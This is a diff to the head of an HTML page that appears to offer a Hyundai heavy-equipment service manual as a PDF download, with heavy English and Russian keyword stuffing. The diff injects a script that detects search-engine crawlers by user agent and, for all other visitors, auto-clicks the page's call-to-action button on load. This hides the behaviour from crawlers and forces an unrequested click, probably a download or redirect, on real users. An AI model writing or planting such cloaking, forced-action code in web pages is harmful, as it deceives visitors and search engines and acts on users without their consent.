@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hyundai Heavy Equipment Service Manual 05.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the Hyundai Heavy Equipment Service Manual 05.2024 in PDF for various machinery types including excavators, loaders, and more. Available in English.">
     <meta name="keywords" content="Hyundai Heavy Equipment Service Manual 05.2024, Hyundai Heavy Equipment Service Manual download, Hyundai Heavy Equipment Service Manual free download, Hyundai equipment service manual pdf, Hyundai equipment service manual 2024, Hyundai service manual download, Hyundai service manual free download, Hyundai equipment service book 2024, Hyundai machinery service manual pdf download, Hyundai Crawler Excavators service manual, Hyundai Wheel Excavators service manual, Hyundai Wheel Loaders service manual, Hyundai Backhoe Loaders service manual, Hyundai Skid Steer Loaders service manual, Hyundai Road Rollers service manual, Hyundai Motor Graders service manual, Hyundai Articulated Dump Trucks service manual, Hyundai Dozers service manual, Hyundai engine manual 2024, скачать руководство по обслуживанию Hyundai, руководство по обслуживанию Hyundai бесплатно скачать, руководство по ремонту Hyundai 2024, Hyundai оборудование руководство по обслуживанию скачать, Hyundai руководство по эксплуатации скачать бесплатно">
     <style>
